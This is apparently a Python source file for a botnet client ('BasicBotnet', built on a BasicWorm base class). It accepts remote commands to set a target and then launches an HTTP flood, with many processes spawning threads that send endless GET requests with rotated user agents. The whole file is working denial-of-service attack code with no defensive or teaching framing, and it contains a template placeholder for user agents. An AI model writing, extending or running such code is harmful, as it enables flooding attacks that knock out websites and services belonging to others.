

import string
from random import choice, sample


class BasicBot(BasicWorm):
    def __init__(self):
        super().__init__()
        self.name = "BasicBotnet"
        self._types_attack = ["http_flood"]
        self._chars = string.ascii_letters + string.digits + string.punctuation
        self.tar = None
        self.type_att = None
        self._work = False
        self._procs = []
        self._thr_no = 20
        self.user_agent = {{ USER_AGENT}}
    
    def _set_target(self, target):
        host = target.replace("http://", "").replace("https://", "").replace("www.", "")
        try:
            ip_target = socket.gethostbyname(host)
            self.send_msg(f"New target is set: {ip_target}")
            return ip_target
        except Exception as e:
            self.send_msg(f"ERROR: Set Target error: {e}")
            return None
    def set_target(self, target):
        self.tar = self._set_target(target)
    
    def set_types(self, types):
        if types not in self._types_attack:
            self.send_msg("ERROR: Unknown Attack Types")
            return None
        self.type_att = types
        self.send_msg(f"Attack Type < {self.type_att} > is set !!")


    def exec_command(self, command):
        if command.startswith("tar"):
            cmd = command.lstrip("tar").strip(" ")
            self.set_target(cmd)
        elif command.startswith("typ"):
            cmd = command.lstrip("typ").strip(" ")
            self.set_types(cmd)
        elif command == "att":
            self.attack()
        elif command == "ATT":
            self.attack(heavy=True)
        elif command == "stp":
            self.stop_attack()
        
    
    def stop_attack(self):
        for p in self._procs:
            try:
                p.terminate()
            except:
                p.kill()
        self._procs = []

    
    def attack(self, heavy=False):
        if self._work:
            self.send_msg("ERROR: keeps attacking")
            return None
        if not self.type_att or not self.tar:
            self.send_msg("ERROR: you need to set the type attack and target")
            return None
        if heavy:
            procs = 30
        else:
            procs = 4
        
        self._work = True
        for x in range(procs):
            self._procs.append(Process(target=self._attack, daemon=True))
        for p in self._procs:
            p.start()
        self.send_msg("ATTACK START !!!!")
        
    
    def _attack(self):
        while True:
            thr = []
            for x in range(self._thr_no):
                thr.append(Thread(target=self.http_request, daemon=True))
            for t in thr:
                t.start()
            


    
    def http_request(self):
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            fake_url = "".join(sample(self._chars, 5))
            raw_socket.connect((self.tar, 80))

            user_agent = choice(self.user_agent)
            # request = f"GET /{fake_url} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent:{user_agent}\r\n\r\n"
            request = f"GET / HTTP/1.1\r\nHost: {self.tar}\r\nUser-Agent:{user_agent}\r\n\r\n"
            print("REQ: ", request)
            raw_socket.send(request.encode())
        except Exception as e:
            print("HTTP ERROR: ", e)

        finally:
            raw_socket.shutdown(socket.SHUT_RDWR)
            raw_socket.close()
    
    def RUN(self):
        while True:
            msg = self.recive_msg()
            print("MSG: ", msg)
            if not msg:
                return True
            if msg.startswith(self.sys_msg):
                self._exec_sys_command(msg)
                continue
            self.exec_command(msg)